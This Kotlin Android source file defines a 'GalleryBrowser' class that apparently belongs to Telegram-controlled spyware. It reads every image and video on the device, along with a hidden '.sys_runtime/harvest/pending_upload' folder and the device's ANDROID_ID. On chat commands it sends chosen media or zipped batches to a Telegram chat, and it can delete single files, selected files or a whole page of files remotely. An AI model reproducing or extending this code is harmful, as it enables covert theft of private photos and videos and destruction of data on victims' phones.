package com.example.app

import android.content.Context
import android.graphics.Bitmap
import android.media.MediaMetadataRetriever
import android.provider.MediaStore
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.random.Random

/**
 * متصفح المعرض (GalleryBrowser) – فئة متطورة لاستعراض وتصنيف الوسائط.
 *
 * ✅ التعديلات الجديدة:
 * - تحديث استعلام MediaStore لاستخدام MediaStore.Files بدلاً من MediaStore.Images
 *   لتوافق أفضل مع Android 14 (API 34) وقيود التخزين.
 * - نظام الترقيم الديناميكي (ثنائي/ثلاثي/رباعي) بناءً على عدد الملفات الكلي.
 * - عرض إجمالي الصفحات والوسائط بوضوح في شريط التنقل.
 * - استخدام Locale.US في جميع عمليات String.format لضمان عرض الأرقام باللاتينية.
 * - إضافة إيموجيز فريدة ومتنوعة للأزرار.
 * - تحسين معالجة الكاش وتحديثه عند تغيير التحديد.
 */
open class GalleryBrowser(
    private val context: Context,
    private val scanner: Any? = null,
    private val telegram: Any? = null
) {
    private val contextRef = WeakReference(context.applicationContext)
    protected val appContext: Context? get() = contextRef.get()

    private val pageSize = 6
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ========== المسارات والمجلدات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    @Volatile
    protected var cachedFiles: List<Map<String, Any>>? = null
    @Volatile
    protected var cacheTimestamp: Long = 0L

    private val cacheLock = Any()
    private val cacheTtlMs = 5000L

    private val selectedIndices = java.util.Collections.synchronizedSet(mutableSetOf<Int>())
    private val lastMessageIdMap = ConcurrentHashMap<Long, Long>()
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "GalleryBrowser"

        @JvmStatic
        fun create(context: Context, scanner: Any? = null, telegram: Any? = null): GalleryBrowser {
            return GalleryBrowser(context, scanner, telegram)
        }
    }

    // ============================================================
    //  جلب الملفات من الجهاز مع التخزين المؤقت
    //  ✅ تم التحديث لاستخدام MediaStore.Files المتوافق مع Android 14+
    // ============================================================

    open fun getGalleryByCategory(category: String, limit: Int): List<Map<String, Any>> {
        val ctx = appContext ?: return emptyList()
        val now = System.currentTimeMillis()

        synchronized(cacheLock) {
            if (cachedFiles != null && (now - cacheTimestamp) < cacheTtlMs) {
                return cachedFiles!!.take(limit)
            }
        }

        val files = mutableListOf<File>()

        try {
            when (category) {
                "pending" -> {
                    val dirs = listOf(
                        File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
                        File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
                    )
                    dirs.forEach { dir ->
                        if (dir.exists()) {
                            dir.listFiles()?.forEach { file ->
                                if (file.isFile && file.length() > 0) {
                                    files.add(file)
                                }
                            }
                        }
                    }
                }
                "all" -> {
                    // ✅ استخدام MediaStore.Files المتوافق مع Android 14
                    val projection = arrayOf(
                        MediaStore.Files.FileColumns.DATA,
                        MediaStore.Files.FileColumns.DISPLAY_NAME,
                        MediaStore.Files.FileColumns.SIZE,
                        MediaStore.Files.FileColumns.DATE_MODIFIED
                    )
                    val selection = "${MediaStore.Files.FileColumns.MEDIA_TYPE} = ? OR ${MediaStore.Files.FileColumns.MEDIA_TYPE} = ?"
                    val selectionArgs = arrayOf(
                        MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE.toString(),
                        MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO.toString()
                    )
                    val sortOrder = "${MediaStore.Files.FileColumns.DATE_MODIFIED} DESC"

                    ctx.contentResolver.query(
                        MediaStore.Files.getContentUri("external"),
                        projection,
                        selection,
                        selectionArgs,
                        sortOrder
                    )?.use { cursor ->
                        val dataIndex = cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA)
                        var count = 0
                        while (cursor.moveToNext() && count < 300) {
                            val path = cursor.getString(dataIndex)
                            if (!path.isNullOrBlank()) {
                                val file = File(path)
                                if (file.exists() && file.isFile) {
                                    files.add(file)
                                    count++
                                }
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getGalleryByCategory error: ${e.message}")
        }

        files.sortByDescending { it.lastModified() }

        val result = files.map { file ->
            mapOf(
                "path" to file.absolutePath,
                "name" to file.name,
                "size" to file.length(),
                "hash" to fileHash(file),
                "timestamp" to (file.lastModified() / 1000),
                "type" to getFileType(file)
            )
        }

        synchronized(cacheLock) {
            cachedFiles = result
            cacheTimestamp = now
        }

        return result.take(limit)
    }

    private fun getFileType(file: File): String {
        val name = file.name.lowercase()
        return when {
            name.endsWith(".jpg") || name.endsWith(".jpeg") ||
            name.endsWith(".png") || name.endsWith(".webp") ||
            name.endsWith(".bmp") || name.endsWith(".gif") -> "image"
            name.endsWith(".mp4") || name.endsWith(".avi") ||
            name.endsWith(".mov") || name.endsWith(".mkv") ||
            name.endsWith(".3gp") || name.endsWith(".webm") -> "video"
            name.endsWith(".mp3") || name.endsWith(".wav") ||
            name.endsWith(".aac") || name.endsWith(".m4a") -> "audio"
            else -> "other"
        }
    }

    private fun fileHash(file: File): String {
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            java.io.FileInputStream(file).use { fis ->
                val buffer = ByteArray(8192)
                var read: Int
                while (fis.read(buffer).also { read = it } != -1) {
                    md.update(buffer, 0, read)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            file.name + file.length()
        }
    }

    open fun getPendingCount(): Int {
        val ctx = appContext ?: return 0
        val dirs = listOf(
            File(ctx.filesDir, ".sys_runtime/.cache_thumb"),
            File(ctx.filesDir, ".sys_runtime/harvest/pending_upload")
        )
        return dirs.sumOf { dir -> dir.listFiles()?.filter { it.isFile }?.size ?: 0 }
    }

    // ============================================================
    //  تحديث معرف الرسالة
    // ============================================================

    fun updateLastMessageId(chatId: Long, messageId: Long) {
        lastMessageIdMap[chatId] = messageId
        Log.d(TAG, "Updated lastMessageId for chat $chatId -> $messageId")
    }

    // ============================================================
    //  استخراج الصورة المصغرة للفيديو (مع توقيتات عشوائية)
    // ============================================================

    private fun generateHumanLikeTimestamp(durationMs: Long): Long {
        if (durationMs < 3000) {
            return durationMs * 1000 / 2
        }

        val minTimeMs = (durationMs * 0.1).toLong()
        val maxTimeMs = (durationMs * 0.9).toLong()

        val humanMinutes = listOf(7, 13, 17, 22, 28, 33, 38, 42, 47, 53, 58)
        val selectedMinutes = humanMinutes[Random.nextInt(humanMinutes.size)]

        val humanSeconds = listOf(7, 13, 17, 22, 28, 33, 38, 42, 47, 53, 58)
        val selectedSeconds = humanSeconds[Random.nextInt(humanSeconds.size)]

        val randomHours = Random.nextInt(0, 3)

        var targetMs = (randomHours * 3600 + selectedMinutes * 60 + selectedSeconds) * 1000L
        targetMs += Random.nextInt(10, 59) * 1000L
        targetMs += Random.nextInt(0, 999)

        if (targetMs < minTimeMs) {
            targetMs = minTimeMs + Random.nextInt(0, 5000)
        }
        if (targetMs > maxTimeMs) {
            targetMs = maxTimeMs - Random.nextInt(0, 5000)
        }

        val secondsPart = (targetMs / 1000) % 60
        if (secondsPart % 5 == 0L) {
            targetMs += Random.nextInt(100, 900)
        }

        return targetMs * 1000
    }

    private fun generateVideoThumbnail(videoFile: File, timeUs: Long = -2): File? {
        val ctx = appContext ?: return null
        val retriever = MediaMetadataRetriever()
        return try {
            retriever.setDataSource(videoFile.absolutePath)
            val durationMs = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION)?.toLongOrNull() ?: 0L

            val actualTimeUs = when {
                timeUs >= 0 -> timeUs
                timeUs == -1L -> durationMs * 1000 / 2
                else -> generateHumanLikeTimestamp(durationMs)
            }

            val bitmap = retriever.getFrameAtTime(actualTimeUs, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
            if (bitmap == null) return null

            val tempDir = File(ctx.cacheDir, "thumbnails")
            if (!tempDir.exists()) tempDir.mkdirs()
            val thumbFile = File(tempDir, "thumb_${System.currentTimeMillis()}_${videoFile.name}.jpg")
            FileOutputStream(thumbFile).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
            }
            bitmap.recycle()
            thumbFile
        } catch (e: Exception) {
            Log.e(TAG, "generateVideoThumbnail error: ${e.message}")
            null
        } finally {
            retriever.release()
        }
    }

    // ============================================================
    //  ✅ إنشاء أزرار شبكية مع ترقيم ديناميكي (ثنائي/ثلاثي/رباعي)
    //  - إذا كان إجمالي الملفات ≤ 99: يستخدم التنسيق الثنائي (01, 02)
    //  - إذا كان إجمالي الملفات > 99: يستخدم التنسيق الثلاثي (001, 002)
    //  - إذا كان إجمالي الملفات > 999: يستخدم التنسيق الرباعي (0001, 0002)
    //  - إجمالي الملفات يُعرض دائماً بثلاثة أرقام (001, 042, 123)
    //  - إجمالي الصفحات يعرض بنفس تنسيق الترقيم (ثنائي/ثلاثي/رباعي)
    //  - ✅ تم التأكيد على استخدام Locale.US في جميع عمليات String.format
    // ============================================================

    fun getGridKb(category: String, page: Int): JSONObject {
        val allFiles = getGalleryByCategory(category, 1000)
        val totalFiles = allFiles.size
        val totalPages = if (totalFiles > 0) (totalFiles + pageSize - 1) / pageSize else 1
        val safePage = page.coerceIn(0, (totalPages - 1).coerceAtLeast(0))

        val startIndex = safePage * pageSize
        val endIndex = (startIndex + pageSize).coerceAtMost(totalFiles)
        val pageFiles = if (startIndex < totalFiles) allFiles.subList(startIndex, endIndex) else emptyList()

        // ✅ تحديد نظام الترقيم بناءً على العدد الكلي للعناصر
        val digits = when {
            totalFiles > 999 -> 4   // رباعي: 0001
            totalFiles > 99 -> 3    // ثلاثي: 001
            else -> 2               // ثنائي: 01
        }
        val formatString = "%0${digits}d"

        // ✅ تنسيق الأرقام مع Locale.US لضمان العرض اللاتيني
        val currentPageStr = String.format(Locale.US, formatString, safePage + 1)
        val totalPagesStr = String.format(Locale.US, formatString, totalPages)
        val totalItemsStr = String.format(Locale.US, "%03d", totalFiles)

        val keyboard = mutableListOf<List<Map<String, String>>>()
        var currentRow = mutableListOf<Map<String, String>>()

        for ((i, file) in pageFiles.withIndex()) {
            val globalIndex = startIndex + i
            val isSelected = selectedIndices.contains(globalIndex)
            val selectEmoji = if (isSelected) "☑️" else "⬜"
            val fileName = (file["name"] as? String)?.take(12) ?: "ملف"
            val fileType = file["type"] as? String ?: "other"
            val typeEmoji = when (fileType) {
                "image" -> "🖼️"
                "video" -> "🎬"
                "audio" -> "🎵"
                else -> "📄"
            }
            // ✅ الترقيم الديناميكي
            val itemNum = String.format(Locale.US, formatString, i + 1)

            currentRow.add(
                mapOf(
                    "text" to "$selectEmoji $typeEmoji [$itemNum] $fileName",
                    "callback_data" to "g_opt|$category|$safePage|$globalIndex"
                )
            )
            if (currentRow.size == 2) {
                keyboard.add(currentRow)
                currentRow = mutableListOf()
            }
        }
        if (currentRow.isNotEmpty()) {
            keyboard.add(currentRow)
        }

        // ✅ شريط التنقل مع الإحصائيات
        val navRow = mutableListOf<Map<String, String>>()
        if (safePage > 0) {
            navRow.add(mapOf("text" to "⬅️", "callback_data" to "g_nav|$category|${safePage - 1}"))
        }
        navRow.add(mapOf(
            "text" to "📊 $currentPageStr/$totalPagesStr | 📁 $totalItemsStr",
            "callback_data" to "g_nav|$category|$safePage"
        ))
        if (safePage < totalPages - 1) {
            navRow.add(mapOf("text" to "➡️", "callback_data" to "g_nav|$category|${safePage + 1}"))
        }
        keyboard.add(navRow)

        // ✅ أزرار الإجراءات مع إيموجيز فريدة
        val actionRow = mutableListOf<Map<String, String>>()
        actionRow.add(mapOf("text" to "🔄 تحديث", "callback_data" to "g_nav|$category|$safePage"))

        val selectAllText = if (pageFiles.isNotEmpty() && pageFiles.all { selectedIndices.contains(startIndex + pageFiles.indexOf(it)) }) {
            "✅ إلغاء الكل"
        } else {
            "☑️ تحديد الكل"
        }
        actionRow.add(mapOf("text" to selectAllText, "callback_data" to "g_selall|$category|$safePage"))
        keyboard.add(actionRow)

        val actionRow2 = mutableListOf<Map<String, String>>()
        actionRow2.add(mapOf("text" to "📦 ضغط المحدد", "callback_data" to "g_zip|$category|$safePage"))
        actionRow2.add(mapOf("text" to "📤 رفع المحدد", "callback_data" to "g_upload|$category|$safePage"))
        actionRow2.add(mapOf("text" to "🗑️ حذف المحدد", "callback_data" to "g_del_sel|$category|$safePage"))
        keyboard.add(actionRow2)

        keyboard.add(
            listOf(
                mapOf("text" to "⚠️ حذف الكل في الصفحة", "callback_data" to "g_conf_del|$category|$safePage")
            )
        )

        keyboard.add(
            listOf(
                mapOf("text" to "🏠 القائمة الرئيسية", "callback_data" to "main")
            )
        )

        return JSONObject(mapOf("inline_keyboard" to keyboard))
    }

    // ============================================================
    //  عرض خيارات ملف محدد
    // ============================================================

    fun showOptions(chatId: Long, category: String, pageStr: String, indexStr: String) {
        if (telegram == null) {
            Log.e(TAG, "Telegram instance is null, cannot show options")
            return
        }

        val page = pageStr.toIntOrNull() ?: 0
        val index = indexStr.toIntOrNull() ?: 0
        val files = getGalleryByCategory(category, 100)
        if (index !in files.indices) {
            Log.w(TAG, "File index out of bounds: $index")
            return
        }

        val fileInfo = files[index]
        val path = fileInfo["path"] as? String ?: return
        val file = File(path)
        if (!file.exists()) {
            Log.w(TAG, "File not found: $path")
            return
        }

        val fileType = getFileType(file)
        val isSelected = selectedIndices.contains(index)
        val selectText = if (isSelected) "✅ إلغاء التحديد" else "☑️ تحديد"

        val optionsKb = listOf(
            listOf(
                mapOf("text" to selectText, "callback_data" to "g_toggle|$category|$page|$index"),
                mapOf("text" to "🔙 رجوع", "callback_data" to "g_nav|$category|$page")
            ),
            listOf(
                mapOf("text" to "🗑️ حذف هذا الملف", "callback_data" to "g_conf_del_one|$category|$page|$index")
            )
        )
        val jsonKb = JSONObject(mapOf("inline_keyboard" to optionsKb)).toString()

        when (fileType) {
            "image" -> {
                val response = invokeTelegramMethod(telegram, "sendPhoto", mapOf(
                    "chat_id" to chatId,
                    "caption" to "🖼️ ${file.name}",
                    "reply_markup" to jsonKb
                ), mapOf("photo" to file))
                updateLastMessageIdFromResponse(chatId, response)
            }
            "video" -> {
                invokeTelegramMethod(telegram, "sendChatAction", mapOf(
                    "chat_id" to chatId,
                    "action" to "upload_video"
                ))
                scope.launch {
                    var response: Any? = null
                    var thumbnail: File? = null
                    try {
                        thumbnail = generateVideoThumbnail(file)
                        response = if (thumbnail != null) {
                            invokeTelegramMethod(telegram, "sendVideo", mapOf(
                                "chat_id" to chatId,
                                "caption" to "🎬 ${file.name}",
                                "reply_markup" to jsonKb,
                                "supports_streaming" to true
                            ), mapOf("video" to file, "thumb" to thumbnail))
                        } else {
                            invokeTelegramMethod(telegram, "sendVideo", mapOf(
                                "chat_id" to chatId,
                                "caption" to "🎬 ${file.name}",
                                "reply_markup" to jsonKb,
                                "supports_streaming" to true
                            ), mapOf("video" to file))
                        }
                        updateLastMessageIdFromResponse(chatId, response)
                    } catch (e: Exception) {
                        Log.e(TAG, "Video send failed", e)
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId,
                            "text" to "❌ فشل إرسال الفيديو: ${e.message?.take(50)}"
                        ))
                    } finally {
                        thumbnail?.delete()
                    }
                }
            }
            "audio" -> {
                val response = invokeTelegramMethod(telegram, "sendAudio", mapOf(
                    "chat_id" to chatId,
                    "caption" to "🎵 ${file.name}",
                    "reply_markup" to jsonKb
                ), mapOf("audio" to file))
                updateLastMessageIdFromResponse(chatId, response)
            }
            else -> {
                val response = invokeTelegramMethod(telegram, "sendDocument", mapOf(
                    "chat_id" to chatId,
                    "caption" to "📄 ${file.name}",
                    "reply_markup" to jsonKb
                ), mapOf("document" to file))
                updateLastMessageIdFromResponse(chatId, response)
            }
        }
    }

    // ============================================================
    //  تنفيذ الإجراءات (مع حماية الكاش بقفل)
    // ============================================================

    fun executeAction(
        chatId: Long,
        action: String,
        category: String,
        pageOrIndex: Any,
        subIndex: Any? = null,
        messageId: Long? = null
    ) {
        try {
            val files = getGalleryByCategory(category, 100).toMutableList()
            val page = pageOrIndex.toString().toIntOrNull() ?: 0

            when (action) {
                "toggle" -> {
                    val index = (subIndex?.toString() ?: pageOrIndex.toString()).toIntOrNull() ?: -1
                    if (index in files.indices) {
                        if (selectedIndices.contains(index)) {
                            selectedIndices.remove(index)
                        } else {
                            selectedIndices.add(index)
                        }
                        synchronized(cacheLock) {
                            cachedFiles = null
                            cacheTimestamp = 0L
                        }
                        updateKeyboard(chatId, category, page, messageId)
                    }
                }

                "selall" -> {
                    val startIndex = page * pageSize
                    val endIndex = (startIndex + pageSize).coerceAtMost(files.size)
                    val pageFiles = if (startIndex < files.size) files.subList(startIndex, endIndex) else emptyList()
                    if (pageFiles.isNotEmpty()) {
                        val allSelected = pageFiles.all { selectedIndices.contains(startIndex + pageFiles.indexOf(it)) }
                        if (allSelected) {
                            pageFiles.forEachIndexed { i, _ -> selectedIndices.remove(startIndex + i) }
                        } else {
                            pageFiles.forEachIndexed { i, _ -> selectedIndices.add(startIndex + i) }
                        }
                        synchronized(cacheLock) {
                            cachedFiles = null
                            cacheTimestamp = 0L
                        }
                        updateKeyboard(chatId, category, page, messageId)
                    }
                }

                "zip" -> {
                    val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                    if (selectedFiles.isEmpty()) {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "⚠️ لم يتم تحديد أي ملفات للضغط"
                        ))
                        return
                    }
                    scope.launch {
                        val zipFile = createZipArchive(selectedFiles)
                        if (zipFile != null) {
                            invokeTelegramMethod(telegram, "sendDocument", mapOf(
                                "chat_id" to chatId,
                                "caption" to "📦 أرشيف مضغوط (${selectedFiles.size} ملف)"
                            ), mapOf("document" to zipFile))
                            zipFile.delete()
                            selectedIndices.clear()
                            synchronized(cacheLock) {
                                cachedFiles = null
                                cacheTimestamp = 0L
                            }
                            updateKeyboard(chatId, category, page, messageId)
                        } else {
                            invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                "chat_id" to chatId, "text" to "❌ فشل إنشاء الأرشيف المضغوط"
                            ))
                        }
                    }
                }

                "upload" -> {
                    val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                    if (selectedFiles.isEmpty()) {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "⚠️ لم يتم تحديد أي ملفات للتحميل"
                        ))
                        return
                    }
                    if (selectedFiles.size <= 3) {
                        selectedFiles.forEach { file ->
                            val fileType = getFileType(file)
                            val method = when (fileType) {
                                "image" -> "sendPhoto"
                                "video" -> "sendVideo"
                                "audio" -> "sendAudio"
                                else -> "sendDocument"
                            }
                            val params = mapOf("chat_id" to chatId, "caption" to "📤 ${file.name}")
                            invokeTelegramMethod(telegram, method, params, mapOf(
                                when (fileType) {
                                    "image" -> "photo"
                                    "video" -> "video"
                                    "audio" -> "audio"
                                    else -> "document"
                                } to file
                            ))
                        }
                        selectedIndices.clear()
                        synchronized(cacheLock) {
                            cachedFiles = null
                            cacheTimestamp = 0L
                        }
                        updateKeyboard(chatId, category, page, messageId)
                    } else {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "📦 عدد الملفات كبير، سيتم ضغطها ثم إرسالها..."
                        ))
                        executeAction(chatId, "zip", category, page, null, messageId)
                    }
                }

                "del_sel" -> {
                    val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                    if (selectedFiles.isEmpty()) {
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "⚠️ لم يتم تحديد أي ملفات للحذف"
                        ))
                        return
                    }
                    var deletedCount = 0
                    selectedFiles.forEach { if (it.exists() && it.delete()) deletedCount++ }
                    selectedIndices.clear()
                    synchronized(cacheLock) {
                        cachedFiles = null
                        cacheTimestamp = 0L
                    }
                    updateKeyboard(chatId, category, page, messageId)
                    invokeTelegramMethod(telegram, "sendMessage", mapOf(
                        "chat_id" to chatId, "text" to "🗑️ تم حذف $deletedCount ملفاً"
                    ))
                }

                "del", "del_one" -> {
                    val index = (subIndex?.toString() ?: pageOrIndex.toString()).toIntOrNull() ?: -1
                    if (index in files.indices) {
                        val path = files[index]["path"] as? String
                        if (path != null) {
                            val file = File(path)
                            if (file.exists() && file.delete()) {
                                selectedIndices.remove(index)
                                synchronized(cacheLock) {
                                    cachedFiles = null
                                    cacheTimestamp = 0L
                                }
                                updateKeyboard(chatId, category, page, messageId)
                                invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                    "chat_id" to chatId, "text" to "✅ تم حذف الملف بنجاح"
                                ))
                            } else {
                                invokeTelegramMethod(telegram, "sendMessage", mapOf(
                                    "chat_id" to chatId, "text" to "❌ فشل حذف الملف"
                                ))
                            }
                        }
                    }
                }

                "del_page" -> {
                    val startIndex = page * pageSize
                    val endIndex = (startIndex + pageSize).coerceAtMost(files.size)
                    var deletedCount = 0
                    if (startIndex < files.size) {
                        for (i in startIndex until endIndex) {
                            val path = files[i]["path"] as? String
                            if (path != null) {
                                val file = File(path)
                                if (file.exists() && file.delete()) {
                                    deletedCount++
                                    selectedIndices.remove(i)
                                }
                            }
                        }
                        synchronized(cacheLock) {
                            cachedFiles = null
                            cacheTimestamp = 0L
                        }
                        updateKeyboard(chatId, category, page, messageId)
                        invokeTelegramMethod(telegram, "sendMessage", mapOf(
                            "chat_id" to chatId, "text" to "🗑️ تم حذف $deletedCount ملفاً من الصفحة ${page + 1}"
                        ))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Execute action error: ${e.message}")
            invokeTelegramMethod(telegram, "sendMessage", mapOf(
                "chat_id" to chatId, "text" to "❌ خطأ: ${e.message?.take(100)}"
            ))
        }
    }

    // ============================================================
    //  تحديث لوحة المفاتيح
    // ============================================================

    private fun updateKeyboard(
        chatId: Long,
        category: String,
        page: Int,
        messageId: Long?,
        text: String = "🖼️ معرض الوسائط"
    ) {
        val newKb = getGridKb(category, page)
        val actualMsgId = messageId ?: lastMessageIdMap[chatId]
        if (actualMsgId != null) {
            invokeTelegramMethod(telegram, "editMessageReplyMarkup", mapOf(
                "chat_id" to chatId,
                "message_id" to actualMsgId,
                "reply_markup" to newKb.toString()
            ))
        } else {
            val response = invokeTelegramMethod(telegram, "sendMessage", mapOf(
                "chat_id" to chatId,
                "text" to text,
                "reply_markup" to newKb.toString()
            ))
            updateLastMessageIdFromResponse(chatId, response)
        }
    }

    // ============================================================
    //  استخراج message_id من استجابة Telegram (محسّن)
    // ============================================================

    private fun updateLastMessageIdFromResponse(chatId: Long, response: Any?) {
        try {
            val result = when (response) {
                is Map<*, *> -> response["result"] as? Map<*, *>
                is JSONObject -> response.optJSONObject("result")?.let { json ->
                    mapOf("message_id" to json.optLong("message_id", 0L))
                }
                else -> null
            }
            val newMsgId = when (val mid = result?.get("message_id")) {
                is Number -> mid.toLong()
                is String -> mid.toLongOrNull()
                else -> null
            }
            if (newMsgId != null && newMsgId > 0) {
                lastMessageIdMap[chatId] = newMsgId
                Log.d(TAG, "Updated lastMessageId from response: chat=$chatId, msgId=$newMsgId")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to extract message_id from response: ${e.message}")
        }
    }

    // ============================================================
    //  إنشاء أرشيف ZIP
    // ============================================================

    private fun createZipArchive(files: List<File>): File? {
        if (files.isEmpty()) return null
        val ctx = appContext ?: return null

        val tempDir = File(runtimeDir, "temp_archives")
        if (!tempDir.exists()) {
            tempDir.mkdirs()
        }

        val zipFile = File(tempDir, "archive_${System.currentTimeMillis()}.zip")
        return try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val buffer = ByteArray(8192)
                files.forEach { file ->
                    if (file.exists()) {
                        java.io.FileInputStream(file).use { fis ->
                            val entry = ZipEntry(file.name)
                            zos.putNextEntry(entry)
                            var len: Int
                            while (fis.read(buffer).also { len = it } > 0) {
                                zos.write(buffer, 0, len)
                            }
                            zos.closeEntry()
                        }
                    }
                }
            }
            if (zipFile.length() > 0) zipFile else null
        } catch (e: Exception) {
            Log.e(TAG, "createZipArchive error: ${e.message}")
            zipFile.delete()
            null
        }
    }

    // ============================================================
    //  دوال مساعدة للاتصال عبر الانعكاس (محسّنة)
    // ============================================================

    private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>, files: Map<String, File>? = null): Any? {
        if (tg == null) return null
        return try {
            val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
            apiMethod?.isAccessible = true

            val cleanParams = params.mapValues { (key, value) ->
                if (key == "reply_markup" && value is Map<*, *>) {
                    JSONObject(value as Map<*, *>).toString()
                } else {
                    value
                }
            }

            if (files != null) {
                apiMethod?.invoke(tg, method, cleanParams, files)
            } else {
                apiMethod?.invoke(tg, method, cleanParams)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Telegram API invocation error ($method): ${e.message}")
            null
        }
    }

    // ============================================================
    //  دوال عامة (مفتوحة للوراثة)
    // ============================================================

    open fun getDid(): String {
        return try {
            val ctx = appContext ?: return "Unknown"
            val androidId = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
            androidId ?: "Unknown"
        } catch (_: Exception) {
            "Unknown"
        }
    }

    open fun runScan(initial: Boolean) {
        Log.d(TAG, "runScan called with initial=$initial")
        synchronized(cacheLock) {
            cachedFiles = null
            cacheTimestamp = 0L
        }
    }

    // ============================================================
    //  دوال إضافية للتحكم في التحديد
    // ============================================================

    fun clearSelection() {
        selectedIndices.clear()
    }

    fun getSelectedCount(): Int = selectedIndices.size
}
